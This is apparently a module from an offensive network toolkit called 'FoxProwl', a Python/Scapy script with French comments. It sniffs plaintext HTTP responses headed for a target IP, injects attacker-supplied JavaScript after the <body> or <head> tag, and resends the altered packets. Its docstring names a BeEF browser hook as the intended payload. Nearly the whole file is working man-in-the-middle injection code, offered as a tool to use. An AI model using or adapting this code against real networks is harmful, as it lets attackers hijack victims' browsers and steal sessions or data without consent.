"""
modules/http_injector.py
Injection de code (JS/HTML) dans le trafic HTTP non chiffré.
Idéal pour injecter le hook BeEF (<script src='...'>).
"""
import re
from scapy.all import sniff, send, IP, TCP, Raw, Ether
from core.logger import log
from core.config import conf

class HTTPInjector:
    def __init__(self, target_ip: str, inject_code: str = None):
        self.target_ip = target_ip
        # Code par défaut : simple alert ou hook beef
        self.inject_code = inject_code or '<script>alert("FoxProwl Injection");</script>'
        self.running = False

    def _inject(self, p):
        if not p.haslayer(Raw): return
        
        try:
            load = p[Raw].load.decode(errors="ignore")
            
            # On cherche les réponses HTTP (Serveur -> Victime)
            if "HTTP/1.1 200 OK" in load and "Content-Type: text/html" in load:
                
                # On essaie d'insérer juste après <body> ou <head>
                if "<body>" in load:
                    new_load = load.replace("<body>", f"<body>{self.inject_code}")
                elif "<head>" in load:
                    new_load = load.replace("<head>", f"<head>{self.inject_code}")
                else:
                    return

                # Recalcul Content-Length
                # (Simplifié pour l'exemple, nécessite une gestion précise des headers en prod)
                # Dans un vrai cas, on utiliserait un proxy MITMproxy, mais ici on est en Raw Socket
                
                # Logique Scapy : on modifie le payload et on laisse Scapy recalculer checksums
                p[Raw].load = new_load.encode()
                del p[IP].len
                del p[IP].chksum
                del p[TCP].chksum
                
                send(p, verbose=False, iface=conf.interface)
                log.success(f"Code injecté dans la réponse vers {p[IP].dst}")
                
        except Exception:
            pass

    def start(self):
        self.running = True
        log.info(f"HTTP Injector actif sur {self.target_ip}")
        # Filtre: Traffic venant du port 80 vers la victime
        sniff(
            iface=conf.interface,
            filter=f"tcp src port 80 and dst host {self.target_ip}",
            prn=self._inject,
            store=0
        )